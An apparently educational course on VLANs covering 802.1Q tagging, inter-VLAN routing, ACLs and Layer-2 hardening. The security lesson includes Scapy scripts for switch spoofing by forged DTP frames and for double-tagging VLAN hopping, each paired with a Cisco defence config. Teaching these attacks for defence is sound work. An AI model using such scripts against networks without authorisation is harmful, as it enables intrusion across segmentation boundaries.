LESSON 1

What Exactly Is a VLAN?

Definitions, broadcast domains, and the five VLAN (Virtual Local Area Network) types

▾
Lesson 1
Lesson 1 · The One-Sentence Definition

VLAN — What It Means

Definition A VLAN (Virtual Local Area Network) is a logical grouping of devices on a switch that behaves like a separate physical network — even though all the devices share the same hardware. The split is enforced in firmware at Layer 2 and is invisible to the connected devices.

Logical, not physical

No extra cables required. The same physical switch hosts many independent virtual networks.

Same hardware, different broadcast domains

Each VLAN (Virtual Local Area Network) is its own broadcast domain — broadcast frames stay inside.

Switch enforces the boundary

The boundary is in switch firmware, at line rate. Devices have no idea VLANs exist.

The Problem VLANs Solve

Without VLANs — One Big Shared Room

  • Every device is in one big shared broadcast domain
  • A broadcast from any port reaches every other port
  • Guest Wi-Fi traffic can reach Admin workstations
  • Compromise one device → adversary sees the whole network

NotPetya (2017) cost Maersk roughly $300M USD in days; the malware spread freely across a flat global network with no Layer-2 firebreaks.

With VLANs — Four Invisible Networks

  • VLAN 10 — Students (ports 1–6)
  • VLAN 20 — Faculty (ports 7–12)
  • VLAN 30 — Admin (ports 13–18)
  • VLAN 40 — Guest Wi-Fi (ports 19–24)

Broadcasts now reach only same-VLAN ports. Cross-VLAN traffic needs a router or Layer-3 switch plus an ACL (Access Control List). Compromise on Guest Wi-Fi cannot pivot to Admin.

LESSON 2

How VLANs Work Under the Hood

Tagging, trunking, access ports, and the IEEE (Institute of Electrical and Electronics Engineers) 802.1Q standard

▾
Lesson 2
Lesson 2 · The Standard

IEEE 802.1Q — The Tag That Makes It All Work

  • Defines a 4-byte tag inserted into every Ethernet frame on a trunk
  • VLAN ID field is 12 bits → 4,094 usable VLANs (IDs 0 and 4095 are reserved)
  • Standard since 1998 — every managed switch on the market supports it

Anatomy of an 802.1Q-tagged Ethernet frame

DST MAC · 6 B SRC MAC · 6 B 802.1Q · 4 B EtherType · 2 B Payload · 46–1500 B FCS · 4 B

The 802.1Q tag carries: TPID (Tag Protocol Identifier), Priority/CoS (Class of Service), DEI (Drop Eligible Indicator), and the 12-bit VLAN ID.

Access Ports vs Trunk Ports

Access Port — Carries ONE VLAN

  • Connects to end devices: PCs, phones, printers
  • Frames travel UNTAGGED in and out — the device has no idea VLANs exist
switchport mode access
switchport access vlan 10

Trunk Port — Carries MANY VLANs

  • Connects switch-to-switch or switch-to-router
  • Frames are TAGGED with their VLAN ID using 802.1Q
switchport mode trunk
switchport trunk allowed vlan 10,20,30

The Native VLAN — The One Worth Hardening

What it is

One VLAN per trunk whose frames are sent UNTAGGED. Used so legacy or un-tagging devices can still cross a trunk.

Why it's risky

Default Native VLAN = VLAN 1 = the same VLAN where unconfigured user ports live. An attacker on VLAN 1 can craft a double-tagged frame whose outer tag matches and gets stripped — the inner tag delivers the frame to a forbidden VLAN.

Hardening — two commands

switchport trunk native vlan 999
vlan dot1q tag native

Key Takeaway 12 bits, 4 bytes, 4,094 — those three numbers carry the entire 802.1Q standard. Access ports talk to humans, trunk ports talk to other switches; mixing them is the #1 source of VLAN bugs.

LESSON 3

VLANs in the Enterprise

Real deployments, inter-VLAN routing, and the role of ACLs (Access Control Lists)

▾
Lesson 3
Lesson 3 · Patterns

Where VLANs Show Up in Real Networks

01 · Office segmentation

Sales, Engineering, Finance each on their own VLAN. Same physical wiring, four enforceable security zones.

02 · Voice + data on shared cabling

IP phones tag voice frames into a Voice VLAN; the PC behind the phone stays on the Data VLAN. One cable, two networks.

03 · Guest isolation

Visitors land on a separate VLAN that reaches the internet but not the corporate LAN (Local Area Network). Trivial to deploy, huge breach-prevention payoff.

Case Study — University Campus

Same 24-port closet switch, four VLANs. Students cannot reach Admin payroll systems even on the same physical switch. Guest Wi-Fi cannot pivot anywhere on the LAN. One physical switch — four enforceable security zones.

Case Study — Hospital (HIPAA — Health Insurance Portability and Accountability Act)

Mercy General Hospital — five VLANs protecting PHI (Protected Health Information):

VLANPurposeContainsInternet?
10Medical DevicesMRI (Magnetic Resonance Imaging), IV pumps, vital monitorsNo
20EHR (Electronic Health Record) ServersPHI database — strictly controlledNo
30Doctor WorkstationsAuthenticated clinical PCsLimited
40HR / AdminPayroll, billing, HR (Human Resources) systemsYes
50Guest Wi-FiPatient and visitor BYOD (Bring Your Own Device)Internet only
The policy ACL on the Layer-3 switch: deny all by default, whitelist only what is clinically required (e.g., doctors → EHR over HTTPS — HyperText Transfer Protocol Secure; medical devices → EHR over HL7 — Health Level Seven).

Inter-VLAN Routing — Two Methods

Method 1 — Router-on-a-Stick

  • One router interface, multiple sub-interfaces (one per VLAN)
  • Switch connects to router via a single trunk port
  • ✓ Simple, cheap
  • ✗ Bandwidth bottleneck at the router uplink

Method 2 — Layer-3 Switch with SVIs (Switch Virtual Interfaces)

  • The switch itself routes between VLANs
  • Each VLAN has an SVI acting as the gateway
  • ✓ Hardware-fast, no link bottleneck
  • ✗ Higher hardware cost

Side-by-Side Static Visualisation

Router-on-a-Stick

Read it: three VLAN access groups → switch trunk → one router physical interface holding three sub-interfaces. Simple, cheap, but every cross-VLAN packet rides the same uplink.

Layer-3 Switch with SVIs

Read it: the same switch routes between VLANs internally, no external uplink involved. Each VLAN gets a virtual gateway interface (the SVI). Wire-speed routing in ASICs.

Quick rule of thumb Inside a single site, a Layer-3 switch usually beats Router-on-a-Stick on price/performance. Dedicated routers earn their keep at the WAN edge — where you need rich routing protocols, NAT, VPN termination, or QoS shaping the silicon in a switch can't do as well.

ACLs — The Policy Layer Above VLANs

Critical insight VLANs ISOLATE by default — but the moment you turn on inter-VLAN routing, every VLAN can reach every other VLAN unless you say otherwise. A VLAN without an ACL is a security boundary on paper only.
  • ACLs (Access Control Lists) apply on the routing device (Layer-3 switch or router)
  • Match on source VLAN, destination VLAN, port, protocol
  • Whitelist what's needed; deny everything else (implicit deny at the end)
Key Takeaway VLAN + ACL = real segmentation. VLAN alone = optimistic segmentation. The VLAN draws the line; the ACL enforces it. Both are required.

LESSON 4

VLANs as a Security Control

Segmentation, blast radius, compliance frameworks, and Defence-in-Depth

▾
Lesson 4
Lesson 4 · Why We Segment

The Segmentation Principle

01 · Limit blast radius

A compromise stops at the VLAN boundary.

02 · Least privilege at the network layer

Devices only reach what they need.

03 · Satisfy compliance

PCI DSS (Payment Card Industry Data Security Standard), HIPAA, NIST CSF (Cybersecurity Framework), CIS (Center for Internet Security) all require it.

04 · Improve performance

Smaller broadcast domains → less noise per switch.

Mental model Think of VLANs as fire doors in a building — each one slows the spread of a problem and gives defenders time to react.

Real-World Reference — NotPetya, 2017

Maersk's flat global network amplified the worm into approximately $300 M USD damage in days. VLANs alone wouldn't have stopped NotPetya — but they would have bought the response team time and dramatically cut total impact.

Where VLANs Sit in Defence-in-Depth

  1. Perimeter — firewall, IPS (Intrusion Prevention System)
  2. Network — VLANs + ACLs ← we are here
  3. Endpoint — EDR (Endpoint Detection and Response), hardening, host firewalls
  4. Identity — 802.1X, MFA (Multi-Factor Authentication), RBAC (Role-Based Access Control)
  5. Data — encryption at rest and in transit
Key Takeaway Segmentation does not stop attacks. It makes them survivable. VLANs are necessary but not sufficient — they make every other layer more effective by reducing the surface each one has to defend.

Eight Attacks at the Switching Layer

01 · Switch Spoofing DTP (Dynamic Trunking Protocol) abuse
02 · Double Tagging VLAN Hopping
03 · MAC Flooding CAM (Content Addressable Memory) overflow
04 · ARP (Address Resolution Protocol) Spoofing SEED Labs by Wenliang Du

Each attack name links to a public, vendor-neutral reference. For hands-on lab walk-throughs, professor Wenliang Du's SEED Labs at Syracuse University remain a gold-standard resource — start with the ARP and TCP attack labs.

Why these matter Most security tools sit at Layer 3 and above. Layer-2 attacks bypass them entirely — which is why we harden the switch.
Ethics & Legal Every attack here is for defensive understanding only. Running these techniques on a network you don't own — or don't have explicit written authorisation to test — violates U.S. CFAA (Computer Fraud and Abuse Act) 18 U.S.C. §1030, Criminal Code of Canada §342.1, and equivalents worldwide. Always obtain written authorisation. Always.

⚔ Attack 1 — Switch Spoofing (DTP Abuse)

ATTACK How the attack crafts a DTP frame to flip a switch port to trunk mode

The attacker’s laptop pretends to be a Cisco switch by sending forged DTP (Dynamic Trunking Protocol) frames. If the switch port is in dynamic mode (the unfortunate default on many platforms), the port flips to trunk and the attacker sees every VLAN. First documented: late 1990s with Cisco DTP shipping in IOS; weaponised in the Yersinia toolkit around 2005.

# Lazy import lets the script run on hosts without Scapy. from scapy.all import Dot3, LLC, SNAP, Raw, sendp # Cisco DTP frames go to a special multicast MAC. DTP_DST = "01:00:0c:cc:cc:cc" SRC_MAC = "aa:bb:cc:dd:ee:ff" # Build the IEEE 802.3 Ethernet header. eth = Dot3(dst=DTP_DST, src=SRC_MAC) # Add LLC + SNAP headers carrying the DTP protocol identifier. llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) snap = SNAP(OUI=0x00000c, code=0x2004) # DTP payload: pretend to be a switch desiring trunk negotiation. dtp_payload = b"\x01\x00\x02\x00\x05\x03..." # trunk-DESIRED status TLV # Stack and send: Ethernet -> LLC -> SNAP -> DTP payload. frame = eth / llc / snap / Raw(load=dtp_payload) sendp(frame, iface="eth0", count=1)

a1-stack: All headers stacked into one Layer-2 frame, ready to fly.
a1-send: FRAME SENT. Switch port flips to TRUNK mode. All VLANs (10, 20, 30, …) are now visible to the attacker.

🛡 Defence 1 — Pin Every Access Port

DEFENSE How the admin shuts DTP down for good

Two interface commands per access port end Switch Spoofing forever. Estimated time to deploy: 60 seconds across an entire access-layer switch with interface range.

! Apply on EVERY access port - kills DTP negotiation forever. Switch(config)# interface range gigabitEthernet 0/1-23 ! Pin the port mode to access. No more "dynamic" anything. Switch(config-if-range)# switchport mode access ! Stop sending and stop accepting DTP frames entirely. Switch(config-if-range)# switchport nonegotiate ! Move users off VLAN 1 to a dedicated Data VLAN. Switch(config-if-range)# switchport access vlan 10 Switch(config-if-range)# end Switch# write memory

⚔ Attack 2 — Double Tagging (VLAN Hopping)

ATTACK How the attack stacks two 802.1Q tags to slip past one switch’s filtering

The attacker crafts a frame with TWO stacked 802.1Q tags. Switch A sees the outer tag matching its Native VLAN and STRIPS it, forwarding the still-tagged inner frame to Switch B — which delivers it to a VLAN the attacker should never reach. One-way attack (no return traffic) but ideal for poisoning, scanning, denial-of-service.

# Two stacked 802.1Q tags - that is the whole trick. from scapy.all import Ether, Dot1Q, IP, ICMP, sendp # Outer tag MUST equal the trunk Native VLAN (default 1). OUTER_VLAN = 1 # matches Native -> Switch A will STRIP it # Inner tag is the FORBIDDEN target VLAN. INNER_VLAN = 100 # the secure VLAN we want to reach # Build Ethernet header. eth = Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff") # Two 802.1Q tags - outer first, then inner. outer = Dot1Q(vlan=OUTER_VLAN) # stripped by Switch A inner = Dot1Q(vlan=INNER_VLAN) # read by Switch B # Stack: Ethernet -> outer tag -> inner tag -> IP -> ICMP. frame = eth / outer / inner / IP(dst="10.0.100.5") / ICMP() sendp(frame, iface="eth0", count=1)

🛡 Defence 2 — Force Tagging on the Native VLAN

DEFENSE The single global command that makes Double Tagging mathematically impossible

One global command, plus belt-and-braces trunk hardening. With native frames forced to be tagged, Switch A no longer strips anything — and the entire double-tagging trick collapses.

! The single command that makes double-tagging mathematically impossible. Switch(config)# vlan dot1q tag native ! Belt-and-braces: move Native VLAN off VLAN 1 to an unused ID. Switch(config)# interface gigabitEthernet 0/24 Switch(config-if)# switchport trunk native vlan 999 ! Restrict the trunk to only the VLANs that should cross it. Switch(config-if)# switchport trunk allowed vlan 10,20,100 Switch(config-if)# end Switch# write memory

The Defensive Configuration Recipe

Every Access Port (six lines)

switchport mode access
switchport nonegotiate
switchport access vlan <data-vlan>
switchport port-security maximum 2
spanning-tree bpduguard enable
no cdp enable

Every Trunk Port (three lines + global)

switchport mode trunk
switchport trunk native vlan 999
switchport trunk allowed vlan <list>
! global:
vlan dot1q tag native
Key Takeaway Six lines per access port, three per trunk. That's the entire Layer-2 hardening checklist — deployable in an afternoon. If you haven't audited it, it isn't hardened.
